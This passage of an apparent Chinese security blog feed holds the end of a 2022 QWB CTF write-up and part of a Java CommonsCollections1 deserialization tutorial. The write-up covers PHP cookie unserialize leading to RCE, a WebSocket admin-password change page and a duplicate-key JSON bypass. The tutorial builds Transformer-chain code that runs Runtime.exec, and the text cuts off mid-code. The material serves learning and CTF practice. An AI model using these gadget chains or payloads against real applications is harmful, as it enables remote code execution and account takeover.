punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>    <span class="token function">exit</span><span class="token punctuation">(</span><span class="token string">"error"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token delimiter">?></span></code></pre><p>showfile.php</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">include</span> <span class="token string">'config.inc.php'</span><span class="token punctuation">;</span><span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$userfile</span> <span class="token keyword">as</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$file</span><span class="token operator">=</span><span class="token function">e</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token string">"&lt;li>&lt;a href=\"./{$file}\" target=\"_blank\">"</span> <span class="token punctuation">.</span> <span class="token variable">$file</span> <span class="token punctuation">.</span> <span class="token string">"&lt;/a>&lt;/li>\n"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token delimiter">?></span></code></pre><p>index.php</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">include</span> <span class="token string">"config.inc.php"</span><span class="token punctuation">;</span><span class="token delimiter">?></span></code></pre><p>config.inc.php</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token function">spl_autoload_register</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function">e</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">return</span> <span class="token function">htmlspecialchars</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token variable">$userfile</span> <span class="token operator">=</span> <span class="token function">empty</span><span class="token punctuation">(</span><span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string">"userfile"</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">:</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string">"userfile"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span></code></pre><p>类似题目<a href="https://www.wangan.com/docs/212">2017湖湘杯-Writeup web400</a></p><p>spl_autoload_register会⾃动include inc⽂件。<br>传⼀个扩展名为inc的⽂件，将imagetype改一下。<br>再访问/showfile.php，，cookie序列化⼀个上传⽂件名的类，rce。</p><p>具体原理还不清楚，貌似是cookie 反序列化执行命令。<br>用蚁剑连接的时候带上cookie即可。</p><h2 id="babyweb"><a href="#babyweb" class="headerlink" title="babyweb"></a>babyweb</h2><p>有三个功能，help，更改密码和访问页面。<br>想要登陆admin账户，想到可以让admin访问一个js页面更改密码（）</p><pre class=" language-javascript"><code class="language-javascript"><span class="token operator">&lt;</span><span class="token operator">!</span>DOCTYPE html<span class="token operator">></span><span class="token operator">&lt;</span>html<span class="token operator">></span>    <span class="token operator">&lt;</span>head<span class="token operator">></span>        <span class="token operator">&lt;</span>meta charset<span class="token operator">=</span><span class="token string">"UTF-8"</span><span class="token operator">></span>         <span class="token operator">&lt;</span>title<span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>title<span class="token operator">></span>    <span class="token operator">&lt;</span><span class="token operator">/</span>head<span class="token operator">></span>     <span class="token operator">&lt;</span>body<span class="token operator">></span>        <span class="token operator">&lt;</span>button id<span class="token operator">=</span><span class="token string">"btn"</span> type<span class="token operator">=</span><span class="token string">"button"</span><span class="token operator">></span>点我发送请求<span class="token operator">&lt;</span><span class="token operator">/</span>button<span class="token operator">></span>    <span class="token operator">&lt;</span><span class="token operator">/</span>body<span class="token operator">></span>     <span class="token operator">&lt;</span>script type<span class="token operator">=</span><span class="token string">"text/javascript"</span> src<span class="token operator">=</span><span class="token string">"js/jquery.js"</span> <span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span> <span class="token operator">&lt;</span>script<span class="token operator">></span>            ws <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">WebSocket</span><span class="token punctuation">(</span><span class="token string">"ws://127.0.0.1:8888/bot"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    ws<span class="token punctuation">.</span>onopen <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">var</span> msg <span class="token operator">=</span> <span class="token string">"changepw 123456"</span><span class="token punctuation">;</span>        ws<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span>msg<span class="token punctuation">)</span><span class="token punctuation">;</span>        document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">"sendbox"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>value <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">;</span>        document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">"chatbox"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span><span class="token string">"你: "</span> <span class="token operator">+</span> msg <span class="token operator">+</span> <span class="token string">"\r\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token punctuation">}</span>    <span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>html<span class="token operator">></span></code></pre><p>登陆进去的页面不太清楚，后续步骤看WP。<br>要购买hint，代码审计，根据python go的json解析不⼀致绕过即可。</p><pre class=" language-json"><code class="language-json"><span class="token punctuation">{</span><span class="token property">"product"</span><span class="token operator">:</span><span class="token punctuation">[</span><span class="token punctuation">{</span><span class="token property">"id"</span><span class="token operator">:</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token property">"num"</span><span class="token operator">:</span><span class="token number">0</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token punctuation">{</span><span class="token property">"id"</span><span class="token operator">:</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token property">"num"</span><span class="token operator">:</span><span class="token number">0</span><span class="token punctuation">}</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token property">"product"</span><span class="token operator">:</span><span class="token punctuation">[</span><span class="token punctuation">{</span><span class="token property">"id"</span><span class="token operator">:</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token property">"num"</span><span class="token operator">:</span><span class="token number">3</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token punctuation">{</span><span class="token property">"id"</span><span class="token operator">:</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token property">"num"</span><span class="token operator">:</span><span class="token number">3</span><span class="token punctuation">}</span><span class="token punctuation">]</span><span class="token punctuation">}</span></code></pre><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>qwb确实都是高手题，还是得多学学。</p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 2022qwb </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java CommonsCollections1链学习</title>
      <link href="/2022/07/22/Java%20CommonsCollections1%E9%93%BE%E5%AD%A6%E4%B9%A0/"/>
      <url>/2022/07/22/Java%20CommonsCollections1%E9%93%BE%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<h1 id="Java-CommonsCollections1链学习"><a href="#Java-CommonsCollections1链学习" class="headerlink" title="Java CommonsCollections1链学习"></a>Java CommonsCollections1链学习</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>Apache Commons 当中有⼀个组件叫做 Apache Commons Collections ，主要封装了Java 的 Collection(集合) 相关类对象，它提供了很多强有⼒的数据结构类型并且实现了各种集合工具类。<br>作为Apache开源项⽬的重要组件，Commons Collections被⼴泛应⽤于各种Java应⽤的开发，⽽正 是因为在⼤量web应⽤程序中这些类的实现以及⽅法的调⽤，这导致了反序列化⽤漏洞的普遍性和严重性。<br>Apache Commons Collections中有⼀个特殊的接口，其中有⼀个实现该接口的类可以通过调用 Java的反射机制来调用任意函数，叫做InvokerTransformer。<br>apache commons-collections组件反序列化漏洞的反射链也称为CC链，自从apache commons-collections组件爆出第一个java反序列化漏洞后，就像打开了java安全的新世界大门一样，之后很多java中间件相继都爆出反序列化漏洞。</p><h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><p><code>CommonsCollections &lt;= 3.2.1</code><br><code>jdk8u66 &lt; 8u71</code><br>可以去<a href="https://www.oracle.com/java/technologies/javase/javase8-archive-downloads.html">下载</a>旧版本。</p><h3 id="CommonsCollections-jar包获取方式"><a href="#CommonsCollections-jar包获取方式" class="headerlink" title="CommonsCollections jar包获取方式"></a>CommonsCollections jar包获取方式</h3><p><strong>1.Maven仓库获取</strong><br><a href="https://search.maven.org/search?q=commons-collections">commons-collections</a><br><img src="https://kingofkb.github.io/medias/image/20220721/maven.png"><br>最重要的一点：CC包版本3.1-3.2.1<br><strong>2.Maven项目导入</strong></p><pre class=" language-java"><code class="language-java"><span class="token operator">&lt;</span>dependency<span class="token operator">></span>    <span class="token operator">&lt;</span>groupId<span class="token operator">></span>commons<span class="token operator">-</span>collections<span class="token operator">&lt;</span><span class="token operator">/</span>groupId<span class="token operator">></span>    <span class="token operator">&lt;</span>artifactId<span class="token operator">></span>commons<span class="token operator">-</span>collections<span class="token operator">&lt;</span><span class="token operator">/</span>artifactId<span class="token operator">></span>    <span class="token operator">&lt;</span>version<span class="token operator">></span><span class="token number">3.2</span><span class="token punctuation">.</span><span class="token number">1</span><span class="token operator">&lt;</span><span class="token operator">/</span>version<span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>dependency<span class="token operator">></span></code></pre><h2 id="CommonsCollections1链"><a href="#CommonsCollections1链" class="headerlink" title="CommonsCollections1链"></a>CommonsCollections1链</h2><p>ysoserial中给出的链</p><pre class=" language-1"><code class="language-1">Gadget chain:    ObjectInputStream.readObject()        AnnotationInvocationHandler.readObject()            Map(Proxy).entrySet()                AnnotationInvocationHandler.invoke()                    LazyMap.get()                        ChainedTransformer.transform()                            ConstantTransformer.transform()                            InvokerTransformer.transform()                                Method.invoke()                                    Class.getMethod()                            InvokerTransformer.transform()                                Method.invoke()                                    Runtime.getRuntime()                            InvokerTransformer.transform()                                Method.invoke()                                    Runtime.exec()</code></pre><h3 id="Transformer接口"><a href="#Transformer接口" class="headerlink" title="Transformer接口"></a>Transformer接口</h3><p>Transformer是一个接口类，提供了一个对象转换方法transform(接收一个对象，然后对对象作一些操作并输出)：</p><pre class=" language-java"><code class="language-java"><span class="token keyword">package</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">interface</span> <span class="token class-name">Transformer</span> <span class="token punctuation">{</span>    Object <span class="token function">transform</span><span class="token punctuation">(</span>Object var1<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>Transformer接口是基于三个类实现的，InvokerTransformer，ChainedTransformer，ConstantTransformer。</p><h4 id="InvokerTransformer类"><a href="#InvokerTransformer类" class="headerlink" title="InvokerTransformer类"></a>InvokerTransformer类</h4><p>其<code>transform</code>方法为：</p><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> Object <span class="token function">transform</span><span class="token punctuation">(</span>Object input<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>input <span class="token operator">==</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> null<span class="token punctuation">;</span>    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>        <span class="token keyword">try</span> <span class="token punctuation">{</span>            Class <span class="token class-name">cls</span> <span class="token operator">=</span> input<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            Method method <span class="token operator">=</span> cls<span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>iMethodName<span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">.</span>iParamTypes<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">return</span> method<span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span>input<span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">.</span>iArgs<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">NoSuchMethodException</span> var5<span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">FunctorException</span><span class="token punctuation">(</span><span class="token string">"InvokerTransformer: The method '"</span> <span class="token operator">+</span> <span class="token keyword">this</span><span class="token punctuation">.</span>iMethodName <span class="token operator">+</span> <span class="token string">"' on '"</span> <span class="token operator">+</span> input<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"' does not exist"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">IllegalAccessException</span> var6<span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">FunctorException</span><span class="token punctuation">(</span><span class="token string">"InvokerTransformer: The method '"</span> <span class="token operator">+</span> <span class="token keyword">this</span><span class="token punctuation">.</span>iMethodName <span class="token operator">+</span> <span class="token string">"' on '"</span> <span class="token operator">+</span> input<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"' cannot be accessed"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">InvocationTargetException</span> var7<span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">FunctorException</span><span class="token punctuation">(</span><span class="token string">"InvokerTransformer: The method '"</span> <span class="token operator">+</span> <span class="token keyword">this</span><span class="token punctuation">.</span>iMethodName <span class="token operator">+</span> <span class="token string">"' on '"</span> <span class="token operator">+</span> input<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"' threw an exception"</span><span class="token punctuation">,</span> var7<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>我们先看一下它的 transform 方法，传入一个对象，然后反射调用。方法值，参数类型，参数都是可控的。<br>其构造器代码如下，这里其实就是一个很标准的任意方法调用。</p><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token function">InvokerTransformer</span><span class="token punctuation">(</span>String methodName<span class="token punctuation">,</span> Class<span class="token punctuation">[</span><span class="token punctuation">]</span> paramTypes<span class="token punctuation">,</span> Object<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">this</span><span class="token punctuation">.</span>iMethodName <span class="token operator">=</span> methodName<span class="token punctuation">;</span>    <span class="token keyword">this</span><span class="token punctuation">.</span>iParamTypes <span class="token operator">=</span> paramTypes<span class="token punctuation">;</span>    <span class="token keyword">this</span><span class="token punctuation">.</span>iArgs <span class="token operator">=</span> args<span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>尝试利用该方法<strong>调用计算器</strong></p><p>正常反射调用Runtime.exec的正常写法为<code>java.lang.Runtime.getRuntime().exec("calc"); </code><br>会有疑问，为啥不写成<code>java.lang.Runtime.exec("calc");</code>呢，这是因为<strong>exec</strong>不是一个<strong>static</strong>方法，在java里必须通过实例化调用。<br>那为啥不写成</p><pre class=" language-java"><code class="language-java">Runtime x<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Runtime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>x<span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span><span class="token string">"calc"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>这是因为，<strong>Runtime</strong>的<strong>constructor</strong>是<strong>private</strong>的，不能直接new出来。但是可以通过<strong>getRuntime</strong> new一个出来。</p><pre class=" language-java"><code class="language-java"><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>functors<span class="token punctuation">.</span>InvokerTransformer<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>functors<span class="token punctuation">.</span>ChainedTransformer<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>functors<span class="token punctuation">.</span>ConstantTransformer<span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">cc1</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> Exception <span class="token punctuation">{</span>        Runtime runtime <span class="token operator">=</span> Runtime<span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        InvokerTransformer x<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span>                <span class="token string">"exec"</span><span class="token punctuation">,</span>                <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span>String<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">}</span><span class="token punctuation">,</span>                <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token string">"calc"</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        x<span class="token punctuation">.</span><span class="token function">transform</span><span class="token punctuation">(</span>runtime<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p><img src="https://kingofkb.github.io/medias/image/20220721/calc.png"></p><h4 id="ChainedTransformer类"><a href="#ChainedTransformer类" class="headerlink" title="ChainedTransformer类"></a>ChainedTransformer类</h4><p>接下来看这个类的transform函数</p><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> Object <span class="token function">transform</span><span class="token punctuation">(</span>Object object<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token keyword">this</span><span class="token punctuation">.</span>iTransformers<span class="token punctuation">.</span>length<span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">{</span>        object <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>iTransformers<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">transform</span><span class="token punctuation">(</span>object<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> object<span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>由此函数可知，该函数会让上一个Transformer的transform结果作为下一个Transformer的transform的输入，以此类推。<br>观察其构造函数</p><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> Transformer<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token function">getTransformers</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span>iTransformers<span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>发现iTransformers数组是用户自己定义的。<br>可以修改payload构造</p><pre class=" language-java"><code class="language-java"><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>Transformer<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>functors<span class="token punctuation">.</span>InvokerTransformer<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>functors<span class="token punctuation">.</span>ChainedTransformer<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>functors<span class="token punctuation">.</span>ConstantTransformer<span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">cc1</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> Exception <span class="token punctuation">{</span>        Runtime runtime <span class="token operator">=</span> Runtime<span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        Transformer d<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">ChainedTransformer</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Transformer</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span>                <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span>                    <span class="token string">"exec"</span><span class="token punctuation">,</span>                    <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span>String<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">}</span><span class="token punctuation">,</span>                    <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token string">"calc"</span><span class="token punctuation">}</span><span class="token punctuation">)</span>        <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        d<span class="token punctuation">.</span><span class="token function">transform</span><span class="token punctuation">(</span>runtime<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><h4 id="ConstantTransformer类"><a href="#ConstantTransformer类" class="headerlink" title="ConstantTransformer类"></a>ConstantTransformer类</h4><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> Object <span class="token function">transform</span><span class="token punctuation">(</span>Object input<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span>iConstant<span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>接受一个对象返回一个常量，无论接收什么对象都返回 iConstant<br>这个常量在构造函数当中</p><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token function">ConstantTransformer</span><span class="token punctuation">(</span>Object constantToReturn<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">this</span><span class="token punctuation">.</span>iConstant <span class="token operator">=</span> constantToReturn<span class="token punctuation">;</span>一种是TransformedMap，另一种Lazymap，ysoserial用的是第二种，下面我会分别聊这两种实现方法<span class="token punctuation">}</span></code></pre><p>也就相当于把构造器里的参数直接return了，和input没啥关系。这个可以作为我们的起点。<br>再构造</p><pre class=" language-java"><code class="language-java"><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>Transformer<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>functors<span class="token punctuation">.</span>InvokerTransformer<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>functors<span class="token punctuation">.</span>ChainedTransformer<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>functors<span class="token punctuation">.</span>ConstantTransformer<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>FileInputStream<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>FileOutputStream<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>ObjectInputStream<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>ObjectOutputStream<span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">cc1</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> Exception <span class="token punctuation">{</span>        Runtime runtime <span class="token operator">=</span> Runtime<span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        Transformer d<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">ChainedTransformer</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Transformer</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span>                <span class="token keyword">new</span> <span class="token class-name">ConstantTransformer</span><span class="token punctuation">(</span>runtime<span class="token punctuation">)</span><span class="token punctuation">,</span>                <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span>                    <span class="token string">"exec"</span><span class="token punctuation">,</span>                    <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span>String<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">}</span><span class="token punctuation">,</span>                    <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token string">"calc"</span><span class="token punctuation">}</span><span class="token punctuation">)</span>        <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//payload序列化</span>        ObjectOutputStream oos <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectOutputStream</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">FileOutputStream</span><span class="token punctuation">(</span><span class="token string">"attack.ser"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        oos<span class="token punctuation">.</span><span class="token function">writeObject</span><span class="token punctuation">(</span>d<span class="token punctuation">)</span><span class="token punctuation">;</span>        ObjectInputStream ois <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectInputStream</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">FileInputStream</span><span class="token punctuation">(</span><span class="token string">"attack.ser"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        Transformer a<span class="token operator">=</span><span class="token punctuation">(</span>ChainedTransformer<span class="token punctuation">)</span>ois<span class="token punctuation">.</span><span class="token function">readObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        d<span class="token punctuation">.</span><span class="token function">transform</span><span class="token punctuation">(</span>null<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>运行后会有报错。<br><img src="https://kingofkb.github.io/medias/image/20220721/error.png"><br>原因是Runtime类的定义没有继承Serializable类，是不支持反序列化的，请注意。</p><h4 id="二次反射绕过Serializable限制"><a href="#二次反射绕过Serializable限制" class="headerlink" title="二次反射绕过Serializable限制"></a>二次反射绕过Serializable限制</h4><p>既然我们可以通过ChainedTransformer执行任意代码，那么我们自然可以执行一些反射方法，来得到Runtime类。也就是要执行<code>Runtime.class.getMethod("getRuntime")</code>。<br>再分析一下InvokerTransformer类中的Transform方法</p><pre class=" language-java"><code class="language-java">Class <span class="token class-name">cls</span> <span class="token operator">=</span> input<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token 